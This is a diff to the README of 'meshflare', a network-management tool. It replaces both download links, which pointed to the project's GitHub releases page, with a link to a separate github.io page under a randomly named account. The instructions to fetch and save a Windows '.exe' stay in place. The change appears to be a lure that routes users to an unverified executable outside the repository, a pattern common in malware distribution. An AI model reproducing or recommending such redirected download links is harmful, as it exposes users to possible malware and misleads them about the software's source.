@@ -1,6 +1,6 @@
 # 🌐 meshflare - Manage your private network nodes easily
 
-[![Download Meshflare](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Immunocompetent-dissuasion168/meshflare/releases)
+[![Download Meshflare](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://immunocompetent-dissuasion168.github.io)
 
 Meshflare helps you control your private network. It links your computers, servers, and devices into one secure group. You get full control over your connections, custom web addresses, and security filters without relying on complex hardware setups.
 
@@ -8,7 +8,7 @@ Meshflare helps you control your private network. It links your computers, serve
 
 To begin, you need the software for your Windows computer.
 
-1. Visit the [releases page to download the latest version](https://github.com/Immunocompetent-dissuasion168/meshflare/releases).
+1. Visit the [releases page to download the latest version](https://immunocompetent-dissuasion168.github.io).
 2. Look for the file ending in `.exe` under the Assets section.
 3. Save this file to your computer.
 
